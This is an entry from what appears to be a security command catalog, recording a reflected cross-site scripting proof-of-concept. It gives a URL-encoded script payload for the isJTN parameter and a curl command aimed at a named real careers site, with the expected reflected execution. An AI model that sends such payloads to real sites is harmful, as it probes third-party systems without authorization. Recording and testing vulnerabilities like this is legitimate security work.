---
id: cmd-uuid-3
data: GET /apply?isJTN=%3Cscript%3Eprompt('ZephrFish')%3C/script%3E HTTP/1.1
tags:
  - xss
  - http-request
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:43.710Z'
verified: false
validated: true
submitted: true
---
# http-get-xss-payload

## Command

```bash
GET /apply?isJTN=%3Cscript%3Eprompt('ZephrFish')%3C/script%3E HTTP/1.1
```

## Description

HTTP GET request demonstrating the reflected XSS by including a URL-encoded script payload in the isJTN parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `isJTN` | Parameter with encoded payload | Yes |
| `%3Cscript%3Eprompt('ZephrFish')%3C/script%3E` | Decodes to <script>prompt('ZephrFish')</script> | Yes |

## Examples

### Basic Usage

```bash
curl "https://careers.informatica.com/apply?isJTN=%3Cscript%3Eprompt(%27ZephrFish%27)%3C/script%3E"
```

### Advanced Usage

Use with Host header: GET /apply?isJTN=... HTTP/1.1\nHost: careers.informatica.com

## Expected Output

HTTP 200 response with payload reflected in HTML, executing prompt in browser.

## Related

- [[Related Procedure: Test-Basic-XSS-Payload-Execution]]
